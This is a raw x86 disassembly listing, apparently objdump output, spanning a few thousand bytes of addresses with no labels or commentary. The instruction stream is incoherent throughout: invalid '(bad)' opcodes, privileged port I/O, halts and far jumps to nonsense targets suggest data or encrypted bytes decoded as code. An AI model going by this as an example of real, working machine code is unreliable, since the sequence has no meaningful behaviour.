  413eb2:	push   esp
  413eb3:	dec    edx
  413eb4:	or     eax,0xacec4d3e
  413eb9:	rcl    DWORD PTR [esi-0x2a],1
  413ebc:	sbb    bl,BYTE PTR [eax-0x39]
  413ebf:	xchg   edi,eax
  413ec0:	cmp    al,0xd4
  413ec2:	in     eax,dx
  413ec3:	add    ecx,ebx
  413ec5:	pop    ds
  413ec6:	add    al,0xf3
  413ec8:	pop    ss
  413ec9:	mov    ah,0x5c
  413ecb:	or     BYTE PTR [ebp+0x4eb2f7a6],dh
  413ed1:	jno    0x413e7e
  413ed3:	pop    eax
  413ed4:	sbb    DWORD PTR [ecx-0x4d],eax
  413ed7:	push   esi
  413ed8:	push   0x97636f60
  413edd:	popa   
  413ede:	dec    ebp
  413edf:	(bad)  
  413ee0:	(bad)  [eax+0x68]
  413ee3:	int3   
  413ee4:	inc    ebx
  413ee5:	sar    DWORD PTR [ebx],1
  413ee7:	sti    
  413ee8:	iret   
  413ee9:	(bad)  
  413eea:	adc    BYTE PTR [ecx-0x31],bl
  413eed:	cmp    eax,0xededd8c6
  413ef2:	push   ss
  413ef3:	sub    BYTE PTR [edx+0x65956e50],bl
  413ef9:	fist   WORD PTR [ebx+0x3896d468]
  413eff:	mov    es,WORD PTR [ebx+0x3d5eb6e2]
  413f05:	shl    BYTE PTR [edx+0x60],cl
  413f08:	jge    0x413f1d
  413f0a:	sub    DWORD PTR [ebx-0x5f],0xffffff99
  413f0e:	fs inc esp
  413f10:	call   0xa20e294
  413f15:	imul   bl
  413f17:	xor    DWORD PTR [edx-0x1d],edx
  413f1a:	pop    edx
  413f1b:	and    eax,0x10cfccb6
  413f20:	js     0x413f11
  413f22:	out    0xa2,eax
  413f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f25:	add    edx,DWORD PTR [edi+0x6b]
  413f28:	cmp    bl,BYTE PTR [ebx+ebp*1-0x702dcfca]
  413f2f:	data16 gs mov ah,0xb5
  413f33:	pop    edi
  413f34:	jae    0x413ecd
  413f36:	iret   
  413f37:	es sub al,0x28
  413f3a:	stos   BYTE PTR es:[edi],al
  413f3b:	ret    0x26ef
  413f3e:	and    eax,0xf9207c4a
  413f43:	adc    ebx,DWORD PTR [eax]
  413f45:	xchg   esp,eax
  413f46:	in     al,dx
  413f47:	cs cdq 
  413f49:	int3   
  413f4a:	popa   
  413f4b:	sbb    cl,BYTE PTR [ebp+ebp*2-0x5175c966]
  413f52:	pop    es
  413f53:	or     edx,DWORD PTR [eax]
  413f55:	and    eax,0x6b9c8043
  413f5a:	mov    dh,0xa2
  413f5c:	mov    DWORD PTR [esi-0x46],eax
  413f5f:	je     0x413fd4
  413f61:	and    BYTE PTR [ebx+0x30f9a369],bl
  413f67:	and    al,0xb4
  413f69:	and    BYTE PTR [edx],bh
  413f6b:	cmp    BYTE PTR [ecx-0x49],bl
  413f6e:	cmc    
  413f6f:	outs   dx,BYTE PTR ds:[esi]
  413f70:	jne    0x413fe6
  413f72:	(bad)  
  413f73:	pop    DWORD PTR [ebx-0x2e]
  413f76:	sahf   
  413f77:	add    al,0x64
  413f79:	add    DWORD PTR [ebp+0x17ea3aa8],edx
  413f7f:	inc    edx
  413f80:	jecxz  0x413f92
  413f82:	cdq    
  413f83:	mov    bl,0xbb
  413f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f86:	xchg   ecx,eax
  413f87:	pop    es
  413f88:	mov    eax,0xa5f1fb2f
  413f8d:	xchg   DWORD PTR [ebp-0x8],ebp
  413f90:	pop    ebp
  413f91:	stc    
  413f92:	hlt    
  413f93:	dec    ebp
  413f94:	or     al,0x30
  413f96:	adc    ebp,eax
  413f98:	jnp    0x413fb1
  413f9a:	adc    BYTE PTR [ebx+0x36f64e4d],cl
  413fa0:	aam    0x77
  413fa2:	leave  
  413fa3:	xchg   esp,eax
  413fa4:	inc    esp
  413fa5:	pop    ebx
  413fa6:	jnp    0x413faa
  413fa8:	and    esi,DWORD PTR [ebx-0x57]
  413fab:	cld    
  413fac:	mov    dh,0x32
  413fae:	cli    
  413faf:	int3   
  413fb0:	jne    0x414020
  413fb2:	test   eax,0x3c7daa33
  413fb7:	mov    DWORD PTR [esi+0x10],0x9b18b6d9
  413fbe:	in     al,dx
  413fbf:	rcl    DWORD PTR [esi-0x6],0x1
  413fc3:	les    eax,FWORD PTR [ebx-0xfb8f52e]
  413fc9:	push   esp
  413fca:	stc    
  413fcb:	mov    ebp,0xad99796a
  413fd1:	pop    ebx
  413fd2:	retf   0xe802
  413fd5:	popa   
  413fd6:	xlat   BYTE PTR ds:[ebx]
  413fd7:	in     al,dx
  413fd8:	xchg   esp,eax
  413fd9:	add    dl,BYTE PTR [edi]
  413fdb:	inc    ecx
  413fdc:	sahf   
  413fdd:	loop   0x41402e
  413fdf:	aas    
  413fe0:	sbb    al,0x90
  413fe2:	lock pop es
  413fe4:	test   al,0x29
  413fe6:	(bad)  
  413fe7:	pushf  
  413fe8:	xchg   edi,esp
  413fea:	ret    
  413feb:	test   eax,0x529eb648
  413ff0:	mov    ebp,0x2d1db8c0
  413ff5:	push   es
  413ff6:	nop
  413ff7:	std    
  413ff8:	jge    0x414050
  413ffa:	jmp    0x9082:0x78560571
  414001:	ins    BYTE PTR es:[edi],dx
  414002:	hlt    
  414003:	aaa    
  414004:	imul   eax,DWORD PTR [ecx],0xffffff9b
  414007:	mov    al,ds:0x845f0344
  41400c:	out    dx,al
  41400d:	sub    DWORD PTR [ebx+0x17],esp
  414010:	daa    
  414011:	stos   DWORD PTR es:[edi],eax
  414012:	mov    esi,0x270ec244
  414017:	jns    0x413fd9
  414019:	sub    al,0xc5
  41401b:	sar    DWORD PTR [eax],cl
  41401d:	adc    al,0x10
  41401f:	xchg   edx,eax
  414020:	ret    0x99ad
  414023:	mov    edx,0x38795d8f
  414028:	add    al,0x5d
  41402a:	mov    cl,0x2c
  41402c:	jnp    0x41406c
  41402e:	retf   0x5c98
  414031:	lds    edx,FWORD PTR [edi-0x76d04dea]
  414037:	mov    BYTE PTR [ebp-0x2],bl
  41403a:	or     ebx,eax
  41403c:	inc    ebp
  41403d:	mov    dh,0x5d
  41403f:	sar    BYTE PTR [edi+0x66973ad1],cl
  414045:	lds    edx,FWORD PTR [edi]
  414047:	dec    ebp
  414048:	push   es
  414049:	ss jmp 0xd7bd5db0
  41404f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414050:	dec    ebx
  414051:	jae    0x41408f
  414053:	push   edi
  414054:	cli    
  414055:	ins    DWORD PTR es:[edi],dx
  414056:	dec    ebp
  414057:	mov    esp,0xec262110
  41405c:	shr    BYTE PTR ds:0x17c7eac7,cl
  414062:	add    BYTE PTR [edi+0x3fa5821],dh
  414068:	mov    eax,ds:0x576f3c7a
  41406d:	mov    ah,0x5c
  41406f:	push   esp
  414070:	and    eax,0xe384b283
  414075:	dec    edx
  414076:	sbb    eax,0xb2c89fd3
  41407b:	add    al,0x57
  41407d:	mov    ecx,DWORD PTR [eax+0x723580fd]
  414083:	add    al,0xad
  414085:	and    eax,0x33927163
  41408a:	cld    
  41408b:	xor    esp,ebx
  41408d:	add    eax,0x660355ba
  414092:	fiadd  WORD PTR [eax]
  414094:	sbb    BYTE PTR [ebp+edi*2-0x35],bl
  414098:	out    dx,al
  414099:	inc    eax
  41409a:	mov    dh,0x1b
  41409c:	dec    esi
  41409d:	cmp    al,0xaa
  41409f:	stos   BYTE PTR es:[edi],al
  4140a0:	test   al,0xa3
  4140a2:	sbb    BYTE PTR [ebp-0x1e],cl
  4140a5:	(bad)  [ebx+0x3f]
  4140a8:	xor    esp,DWORD PTR [ebx]
  4140aa:	dec    edi
  4140ab:	pop    esi
  4140ac:	xchg   ecx,eax
  4140ad:	test   eax,0x4b180ae3
  4140b2:	test   eax,0x515df82b
  4140b7:	mov    eax,ds:0xf426f57f
  4140bc:	or     ebp,DWORD PTR [ebp+0x2eac1929]
  4140c2:	popf   
  4140c3:	arpl   WORD PTR [edi+0xe4d24db],di
  4140c9:	or     eax,DWORD PTR [esi-0x5f]
  4140cc:	dec    ebp
  4140cd:	lods   eax,DWORD PTR ds:[esi]
  4140ce:	pop    esi
  4140cf:	xchg   esi,eax
  4140d0:	cmp    BYTE PTR [eax],cl
  4140d2:	mov    dl,0x81
  4140d4:	mov    ah,BYTE PTR [edi+0x2e72fabb]
  4140da:	push   ecx
  4140db:	sub    ah,al
  4140dd:	js     0x414157
  4140df:	mov    dh,BYTE PTR [ebp+0x7a4f411d]
  4140e5:	pusha  
  4140e6:	loope  0x414155
  4140e8:	jno    0x414112
  4140ea:	test   dh,dl
  4140ec:	std    
  4140ed:	pop    ebp
  4140ee:	test   eax,0xe973cae5
  4140f3:	pop    edi
  4140f4:	dec    eax
  4140f5:	jns    0x4140a1
  4140f7:	mov    edx,DWORD PTR [ecx]
  4140f9:	sub    eax,0x5b171803
  4140fe:	dec    ecx
  4140ff:	push   ds
  414100:	xor    esp,esi
  414102:	dec    edi
  414103:	(bad)  
  414104:	push   eax
  414105:	add    al,0x29
  414107:	lock out dx,al
  414109:	jl     0x4140af
  41410b:	inc    edx
  41410c:	add    BYTE PTR [ecx-0x23],0x4c
  414110:	mov    al,ds:0x3c59e6f5
  414115:	jne    0x414116
  414117:	retf   0xbc2b
  41411a:	(bad)  
  41411b:	cld    
  41411c:	scas   eax,DWORD PTR es:[edi]
  41411d:	mov    esi,0xe63dcffd
  414122:	lds    ebp,FWORD PTR [ebx+0x2]
  414125:	push   0xc7917b19
  41412a:	cmc    
  41412b:	jo     0x41413d
  41412d:	popf   
  41412e:	jne    0x4140d2
  414130:	ins    DWORD PTR es:[edi],dx
  414131:	push   esp
  414132:	das    
  414133:	xor    al,0xbd
  414135:	pop    es
  414136:	mov    esi,0xd19c0e1a
  41413b:	push   ebp
  41413c:	lods   al,BYTE PTR ds:[esi]
  41413d:	jbe    0x4141a6
  41413f:	mov    WORD PTR [ecx+0x43ffc34b],?
  414145:	je     0x4140ea
  414147:	fmul   DWORD PTR [ecx+ebp*1]
  41414b:	retf   0x8fb9
  41414e:	mov    ebp,ebp
  414150:	(bad)  
  414151:	not    bh
  414153:	cli    
  414154:	jo     0x4140fc
  414156:	sbb    eax,0x287dcce7
  41415b:	jbe    0x4141a1
  41415d:	xor    ah,BYTE PTR [ecx]
  41415f:	fild   QWORD PTR [ebp-0x56f58e73]
  414165:	div    BYTE PTR ss:[edx+edx*1]
  414169:	daa    
  41416a:	cmp    al,0x8b
  41416c:	and    ebx,esp
  41416e:	gs xor ah,dl
  414171:	leave  
  414172:	cmp    al,0x8b
  414174:	ja     0x41415d
  414176:	or     al,0x45
  414178:	jmp    0xf3cb:0xfe537dda
  41417f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414181:	rol    DWORD PTR [ebx+0x1d],1
  414184:	bound  ecx,QWORD PTR [ebx-0x15]
  414187:	and    ah,BYTE PTR [eax]
  414189:	mov    edi,0x6946f079
  41418e:	pop    ecx
  41418f:	sbb    ecx,ebx
  414191:	(bad)  
  414192:	fstp   DWORD PTR [edx+0x10b7a855]
  414198:	es push esi
  41419a:	fcmovbe st,st(7)
  41419c:	sbb    ebp,edi
  41419e:	fld    QWORD PTR [ebp-0x2b39a089]
  4141a4:	jecxz  0x41421a
  4141a6:	into   
  4141a7:	xor    ecx,DWORD PTR [edx-0x77f48d45]
  4141ad:	add    BYTE PTR ds:0x4dde7f0,cl
  4141b3:	fstp   st(5)
  4141b5:	xchg   esi,eax
  4141b6:	cmp    al,0x18
  4141b8:	xchg   esp,eax
  4141b9:	mov    cs,WORD PTR [esi+0x53]
  4141bc:	or     cl,ch
  4141be:	dec    edi
  4141bf:	das    
  4141c0:	test   eax,0xbef88a8e
  4141c5:	aaa    
  4141c6:	or     edi,ecx
  4141c8:	out    dx,eax
  4141c9:	sahf   
  4141ca:	sub    eax,0x51685079
  4141cf:	xlat   BYTE PTR ds:[ebx]
  4141d0:	mov    ds:0x1b51b698,al
  4141d5:	and    BYTE PTR [ecx+0x3cac811c],bl
  4141db:	cli    
  4141dc:	cwde   
  4141dd:	popf   
  4141de:	clc    
  4141df:	xchg   ebx,eax
  4141e0:	and    al,0xac
  4141e2:	jae    0x4141b7
  4141e4:	jl     0x41425f
  4141e6:	dec    ecx
  4141e7:	mov    al,ds:0xeaa4e0a3
  4141ec:	(bad)  
  4141ed:	(bad)  
  4141ee:	mov    bh,0xd0
  4141f0:	pushf  
  4141f1:	add    DWORD PTR [esi+ebp*4+0x7f],0xffffffb3
  4141f6:	pop    ebp
  4141f7:	mov    ebp,0xc3214cec
  4141fc:	mov    gs,WORD PTR [edx+0x5a080a4b]
  414202:	imul   eax,DWORD PTR [edx+0x2e],0x1f3e9f71
  414209:	push   eax
  41420a:	inc    edx
  41420b:	xchg   ecx,eax
  41420c:	and    BYTE PTR [edi+0x39],0xae
  414210:	data16 hlt 
  414212:	xlat   BYTE PTR ds:[ebx]
  414213:	clc    
  414214:	iret   
  414215:	inc    edi
  414216:	cld    
  414217:	xor    BYTE PTR [ecx-0x4c],ah
  41421a:	ins    BYTE PTR es:[edi],dx
  41421b:	add    DWORD PTR [edi],esi
  41421d:	xor    al,0x70
  41421f:	or     eax,0x752144f2
  414224:	mov    cs,WORD PTR [eax]
  414226:	cmp    al,0x9b
  414228:	daa    
  414229:	int3   
  41422a:	imul   BYTE PTR [esi]
  41422c:	add    DWORD PTR [ecx-0x5bac37fe],esi
  414232:	mov    al,0xe2
  414234:	je     0x414295
  414236:	mov    fs,ebx
  414238:	or     al,0x21
  41423a:	mov    edi,0x5af7f153
  41423f:	das    
  414240:	mov    ds:0x1b71f053,al
  414245:	lods   eax,DWORD PTR ds:[esi]
  414246:	ins    DWORD PTR es:[edi],dx
  414247:	clc    
  414248:	inc    eax
  414249:	mov    dl,0x79
  41424b:	xor    DWORD PTR [ebx+edx*8+0x62],0x32057f29
  414253:	(bad)  
  414254:	sub    al,0xbb
  414256:	dec    ebx
  414257:	adc    bh,BYTE PTR [esi+0x5c]
  41425a:	jge    0x414258
  41425c:	jo     0x414220
  41425e:	xchg   BYTE PTR [edi-0x6e],ah
  414261:	lahf   
  414262:	fistp  DWORD PTR [ebx-0x11]
  414265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414266:	mov    dl,0x26
  414268:	les    esp,FWORD PTR [edx-0x5c9c39a3]
  41426e:	inc    eax
  41426f:	retf   
  414270:	ss sbb eax,0x3f749b0c
  414276:	sar    edx,cl
  414278:	in     al,0x98
  41427a:	sub    al,0x5a
  41427c:	cmp    DWORD PTR [ecx-0x6dff3d40],0xffffffbe
  414283:	iret   
  414284:	sub    al,0x61
  414286:	in     al,0x4b
  414288:	clc    
  414289:	xor    BYTE PTR [ebx-0xa],bl
  41428c:	iret   
  41428d:	es xchg dl,dh
  414290:	retf   
  414291:	jp     0x414214
  414293:	pop    esp
  414294:	mov    cl,0x48
  414296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414297:	ret    0xbc74
  41429a:	add    al,0xaa
  41429c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41429d:	jnp    0x4142f8
  41429f:	pop    esp
  4142a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a1:	fld    DWORD PTR [ecx+esi*1+0x2e]
  4142a5:	cmc    
  4142a6:	scas   eax,DWORD PTR es:[edi]
  4142a7:	imul   eax,eax,0x98585ee2
  4142ad:	push   cs
  4142ae:	xchg   DWORD PTR [ebp+0x3c],edi
  4142b1:	adc    DWORD PTR [ebx],esp
  4142b3:	push   eax
  4142b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142b5:	and    cl,BYTE PTR [eax]
  4142b7:	pop    edx
  4142b8:	loope  0x414280
  4142ba:	rcr    DWORD PTR [ebx+0x3f09a5ea],cl
  4142c0:	bound  ebx,QWORD PTR [ebp-0x7b3bfea0]
  4142c6:	xchg   esp,eax
  4142c7:	out    0xe8,al
  4142c9:	add    edi,ebx
  4142cb:	ins    BYTE PTR es:[edi],dx
  4142cc:	cmp    ebx,DWORD PTR [esi]
  4142ce:	fst    DWORD PTR [eax-0x77747f37]
  4142d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d5:	or     eax,0xdc427d3f
  4142da:	fbld   TBYTE PTR [eax+ebx*4+0x69]
  4142de:	push   eax
  4142df:	call   0xb6c44d4f
  4142e4:	jbe    0x4142b2
  4142e6:	cmp    bh,BYTE PTR [edi+0x7bc440e5]
  4142ec:	fs (bad) 
  4142ee:	cs out dx,al
  4142f0:	add    al,0xe8
  4142f2:	inc    eax
  4142f3:	push   ebp
  4142f4:	mov    dh,0x32
  4142f6:	retf   
  4142f7:	mov    al,ds:0x1af4f48a
  4142fc:	inc    cl
  4142fe:	std    
  4142ff:	mov    eax,0x784198c8
  414304:	jmp    0x3a9632fc
  414309:	xchg   ecx,eax
  41430a:	scas   al,BYTE PTR es:[edi]
  41430b:	push   ds
  41430c:	not    DWORD PTR [bx+di]
  41430f:	jecxz  0x4142c9
  414311:	sbb    al,0xf3
  414313:	jns    0x4142ae
  414315:	sbb    al,0xa2
  414317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414319:	inc    esi
  41431a:	cmp    DWORD PTR [edx+0x1],edx
  41431d:	mov    es,WORD PTR [esi]
  41431f:	and    eax,0x6417d74c
  414324:	sub    al,0xcb
  414326:	lods   eax,DWORD PTR ds:[esi]
  414327:	or     BYTE PTR [edi],al
  414329:	dec    ebx
  41432a:	inc    ecx
  41432b:	sbb    eax,0x76fbfd49
  414330:	outs   dx,BYTE PTR ds:[esi]
  414331:	xor    al,0x25
  414333:	pop    edi
  414334:	stos   DWORD PTR es:[edi],eax
  414335:	lahf   
  414336:	mov    esi,0x391cda6d
  41433b:	add    DWORD PTR [ebp-0x5c],eax
  41433e:	fs pop ecx
  414340:	mov    ebx,0x909a3ea6
  414345:	hlt    
  414346:	loop   0x4142f9
  414348:	stos   BYTE PTR es:[edi],al
  414349:	aas    
  41434a:	or     BYTE PTR [edi+0x2448d074],0x73
  414351:	xchg   ecx,eax
  414352:	pop    ds
  414353:	xchg   esp,eax
  414354:	push   esi
  414355:	cmp    eax,0x80c6af9
  41435a:	mov    bl,0x98
  41435c:	or     ch,ch
  41435e:	sub    eax,0xb84a6bca
  414363:	call   0x3030:0x1b5dbef
  41436a:	ret    0xd788
  41436d:	mov    ah,0xb9
  41436f:	xor    al,0xdd
  414371:	pop    ebx
  414372:	jb     0x4142f5
  414374:	rcr    DWORD PTR [edi],0x8f
  414377:	adc    al,0xcd
  414379:	inc    esi
  41437a:	pop    esp
  41437b:	add    al,0x45
  41437d:	push   ds
  41437e:	cli    
  41437f:	or     al,0x52
  414381:	xchg   dl,ch
  414383:	pop    esi
  414384:	fucomp st(0)
  414386:	adc    al,0x89
  414388:	mov    eax,ds:0xc4c9f92
  41438d:	fdiv   DWORD PTR [eax-0x1a4aaeaa]
  414393:	push   ebp
  414394:	xchg   esp,eax
  414395:	inc    esi
  414396:	mov    bl,0xc1
  414398:	jno    0x414380
  41439a:	loopne 0x4143d6
  41439c:	je     0x414417
  41439e:	mov    dl,0x30
  4143a0:	ret    0x5071
  4143a3:	loope  0x414405
  4143a5:	loopne 0x4143fb
  4143a7:	push   0xffffff8c
  4143a9:	out    dx,eax
  4143aa:	push   0x19
  4143ac:	jmp    0x4143a2
  4143ae:	add    BYTE PTR [ebx+eiz*1],dh
  4143b1:	fadd   QWORD PTR [eax+0x29]
  4143b4:	sub    edx,DWORD PTR [ebp+0x4f]
  4143b7:	dec    edi
  4143b8:	jo     0x414409
  4143ba:	cli    
  4143bb:	adc    al,0x24
  4143bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143be:	sbb    al,0x1
  4143c0:	and    eax,0x223ff3cc
  4143c5:	lock sbb al,0xa7
  4143c8:	popa   
  4143c9:	mov    edx,0xe95de65d
  4143ce:	xlat   BYTE PTR ds:[ebx]
  4143cf:	cdq    
  4143d0:	stos   DWORD PTR es:[edi],eax
  4143d1:	jbe    0x41441d
  4143d3:	pop    ebx
  4143d4:	push   ebp
  4143d5:	sub    cl,BYTE PTR [eax]
  4143d7:	int3   
  4143d8:	out    dx,eax
  4143d9:	sub    eax,0xe7bd0abf
  4143de:	lahf   
  4143df:	xlat   BYTE PTR ds:[ebx]
  4143e0:	(bad)  
  4143e1:	loope  0x414396
  4143e3:	call   0x291d:0xbd41f9d3
  4143ea:	xor    edi,ebp
  4143ec:	scas   eax,DWORD PTR es:[edi]
  4143ed:	jne    0x414386
  4143ef:	jmp    0x27e7e27a
  4143f4:	pop    ecx
  4143f5:	ror    BYTE PTR ds:0x3a5cefa7,cl
  4143fb:	iret   
  4143fc:	mov    BYTE PTR ds:0x8723c0e6,dl
  414402:	sub    eax,0xd1db0b54
  414407:	jnp    0x41441d
  414409:	xchg   esp,eax
  41440a:	or     dh,ah
  41440c:	cmp    BYTE PTR [edi],0x7d
  41440f:	ret    
  414410:	mov    dh,0x98
  414413:	push   esi
  414414:	mov    al,ds:0x13a4211b
  414419:	aaa    
  41441a:	les    ebx,FWORD PTR [edx]
  41441c:	outs   dx,BYTE PTR ds:[esi]
  41441d:	retf   0x9ab7
  414420:	loop   0x41445c
  414422:	sbb    BYTE PTR [ebx+0x18],dl
  414425:	sar    BYTE PTR [esi-0x7539ad40],0x9
  41442c:	ret    
  41442d:	daa    
  41442e:	xchg   edi,eax
  41442f:	outs   dx,DWORD PTR ds:[esi]
  414430:	outs   dx,DWORD PTR ds:[esi]
  414431:	stc    
  414432:	cli    
  414433:	or     edx,edx
  414435:	shl    BYTE PTR [edx+0x2a12b02a],cl
  41443b:	mov    cl,0xc
  41443d:	imul   BYTE PTR [ebp+0x55]
  414440:	dec    ebx
  414441:	xchg   eax,esp
  414443:	in     al,0x8d
  414445:	mov    ebp,esp
  414447:	mov    ah,0x20
  414449:	sub    al,0xf4
  41444b:	mov    bh,0x47
  41444d:	into   
  41444e:	call   0x37ce63d3
  414453:	fdiv   QWORD PTR ds:0x5e16ecca
  414459:	fsubr  DWORD PTR [esi]
  41445b:	xor    ch,cl
  41445d:	pop    esp
  41445e:	sbb    BYTE PTR [ebp+0x11],al
  414461:	dec    ecx
  414462:	gs loopne 0x41444e
  414465:	popa   
  414466:	jnp    0x414470
  414468:	or     eax,0xd1f7055f
  41446d:	scas   al,BYTE PTR es:[edi]
  41446e:	int3   
  41446f:	cmc    
  414470:	ins    BYTE PTR es:[edi],dx
  414471:	pop    edi
  414472:	(bad)  
  414474:	sub    ebx,DWORD PTR [edx-0x64629899]
  41447a:	mov    esi,0x5fdb42a7
  41447f:	arpl   cx,ax
  414481:	xchg   edx,eax
  414482:	fs push es
  414484:	sti    
  414485:	sahf   
  414486:	push   ds
  414487:	or     bh,bh
  414489:	int    0x69
  41448b:	into   
  41448c:	(bad)  
  41448d:	pop    ebp
  41448e:	je     0x41443b
  414490:	ins    DWORD PTR es:[edi],dx
  414491:	or     DWORD PTR [edi-0x3],edi
  414494:	mov    bh,0xda
  414496:	jns    0x4144e3
  414498:	mov    WORD PTR [edx+eax*1+0x2ffc411f],ds
  41449f:	cmp    ebp,0x74068b7b
  4144a5:	icebp  
  4144a6:	push   edx
  4144a7:	ds out 0x8b,eax
  4144aa:	je     0x4144a7
  4144ac:	sahf   
  4144ad:	aam    0x3a
  4144af:	icebp  
  4144b0:	xchg   ebp,eax
  4144b1:	retf   0xa031
  4144b4:	dec    edx
  4144b5:	aad    0xbb
  4144b7:	outs   dx,BYTE PTR ds:[esi]
  4144b8:	or     al,cl
  4144ba:	es jge 0x4144fe
  4144bd:	call   0xfb4c:0xc4bf78ec
  4144c4:	xor    DWORD PTR [ecx+0x7f],edi
  4144c7:	jnp    0x414487
  4144c9:	or     bl,BYTE PTR [eax+0x55]
  4144cc:	(bad)  
  4144cd:	ja     0x41451e
  4144cf:	adc    cl,BYTE PTR [ebx-0x45]
  4144d2:	outs   dx,BYTE PTR ds:[esi]
  4144d3:	les    eax,FWORD PTR [esi+0x65]
  4144d6:	xor    DWORD PTR [ebp-0x2c0156ea],eax
  4144dc:	xlat   BYTE PTR ds:[ebx]
  4144dd:	cs mov dh,0x31
  4144e0:	mov    bl,0xc7
  4144e2:	sbb    eax,0xf2ca9a5
  4144e7:	daa    
  4144e8:	outs   dx,BYTE PTR ds:[esi]
  4144e9:	xor    edx,DWORD PTR ds:0xf2e62e17
  4144ef:	test   al,0x17
  4144f1:	xchg   DWORD PTR [eax],ebp
  4144f3:	shl    DWORD PTR ds:0x2ca9e9ab,cl
  4144f9:	xor    dh,BYTE PTR [eax+0x447d8b39]
  4144ff:	es aaa 
  414501:	push   edx
  414502:	pop    es
  414503:	imul   ebp,DWORD PTR [ecx-0x3fe1650b],0xfffffff3
  41450a:	mov    esp,0x14ba170b
  41450f:	add    eax,0x88ea556f
  414514:	push   ds
  414515:	repz jae 0x41453b
  414518:	xor    ch,BYTE PTR [edi-0x51]
  41451b:	rol    ch,cl
  41451d:	sbb    al,0x46
  41451f:	(bad)  
  414520:	bnd js 0x41455c
  414523:	cmp    bl,bh
  414525:	(bad)  
  414526:	xchg   ecx,eax
  414527:	jl     0x4144d3
  414529:	outs   dx,BYTE PTR ds:[esi]
  41452a:	push   ebp
  41452b:	(bad)  
  41452c:	dec    esi
  41452d:	mov    WORD PTR [ebx],?
  41452f:	xchg   edi,eax
  414530:	mov    bh,0x6d
  414532:	jg     0x414592
  414534:	pushf  
  414535:	ret    0x921f
  414538:	jbe    0x4145ac
  41453a:	pop    ecx
  41453b:	and    DWORD PTR [esp+edi*8-0x4d],edx
  41453f:	add    eax,0x83f9f76c
  414544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414545:	scas   eax,DWORD PTR es:[edi]
  414546:	mov    ah,0x8b
  414548:	sbb    eax,edi
  41454a:	in     al,dx
  41454b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41454c:	arpl   WORD PTR [edx-0x2f],si
  41454f:	adc    edi,DWORD PTR [eax+0x784b7740]
  414555:	aam    0x1f
  414557:	iret   
  414558:	ins    BYTE PTR es:[edi],dx
  414559:	push   es
  41455a:	(bad)  
  41455b:	fimul  DWORD PTR [ecx-0x45]
  41455e:	into   
  41455f:	lock out 0xd3,al
  414562:	(bad)  
  414564:	xor    al,0x85
  414566:	or     eax,0xdf0d920d
  41456b:	push   edx
  41456c:	inc    edx
  41456d:	out    0x9e,al
  41456f:	adc    dl,BYTE PTR [edx+ebp*4]
  414572:	jecxz  0x414517
  414574:	sbb    ecx,DWORD PTR [ecx+0x6660729b]
  41457a:	mov    ds:0xba7fdcd6,eax
  41457f:	cmp    dl,cl
  414581:	dec    esi
  414582:	int3   
  414583:	jnp    0x4145ab
  414585:	mov    ds:0x84d95b43,al
  41458a:	mov    bh,0xfb
  41458c:	in     eax,dx
  41458d:	mov    ah,al
  41458f:	cwde   
  414590:	mov    eax,0x9f0744f8
  414595:	ret    
  414596:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414598:	mov    eax,ds:0xb20990fa
  41459d:	adc    eax,0x727e2abf
  4145a2:	xor    BYTE PTR [ecx-0x7e37327f],al
  4145a8:	push   esp
  4145a9:	xor    DWORD PTR [ebx+0x29a95b02],ecx
  4145af:	pushf  
  4145b0:	jge    0x41453e
  4145b2:	xchg   edi,eax
  4145b3:	jns    0x4145c4
  4145b5:	cmp    BYTE PTR [eax-0x7241e52b],ah
  4145bb:	jmp    FWORD PTR [edi+esi*8-0x4c]
  4145bf:	jp     0x414557
  4145c1:	push   ebx
  4145c2:	mov    esp,0xf5a28741
  4145c7:	xchg   esi,eax
  4145c8:	jne    0x4145f6
  4145ca:	dec    ebp
  4145cb:	daa    
  4145cc:	dec    ebp
  4145cd:	push   ebp
  4145ce:	sbb    bl,ah
  4145d0:	mov    ds:0x87c3bfe0,eax
  4145d5:	pop    es
  4145d6:	retf   0x3e12
  4145d9:	xchg   ebx,eax
  4145da:	fwait
  4145db:	jmp    0x414643
  4145dd:	xor    ch,BYTE PTR [esi+0x39]
  4145e0:	js     0x41462a
  4145e2:	int3   
  4145e3:	ins    DWORD PTR es:[edi],dx
  4145e4:	int    0x38
  4145e6:	push   esi
  4145e7:	sbb    eax,0xabec7e81
  4145ec:	pop    eax
  4145ed:	les    ebx,FWORD PTR ds:0x25694b90
  4145f3:	popa   
  4145f4:	cwde   
  4145f5:	sbb    ebx,DWORD PTR [edi+esi*8-0x7ba600ba]
  4145fc:	test   BYTE PTR [edi+edi*2-0x3c],cl
  414600:	aad    0x61
  414602:	in     al,0xb7
  414604:	and    DWORD PTR [edi],edx
  414606:	push   ebp
  414607:	cmc    
  414608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414609:	dec    edx
  41460a:	xchg   DWORD PTR [ebp+0x43f855f9],esi
  414610:	ficom  WORD PTR [edi]
  414612:	xchg   ebx,eax
  414613:	inc    ebx
  414614:	mov    ah,0x4f
  414616:	mov    bh,0x4
  414618:	mov    esp,0xa49eb34c
  41461d:	adc    DWORD PTR [eax+0x1fa3685a],esp
  414623:	test   eax,0x15ce516
  414628:	xchg   esp,eax
  414629:	(bad)
  41462c:	(bad)  
  41462d:	adc    BYTE PTR [ebp-0x2d09cf7d],dh
  414633:	mov    esi,0xcccffeea
  414638:	add    BYTE PTR [ebx],bh
  41463a:	mov    edi,DWORD PTR [ecx]
  41463c:	cli    
  41463d:	popa   
  41463e:	call   0xaa08:0xf10f0f57
  414645:	outs   dx,DWORD PTR ds:[esi]
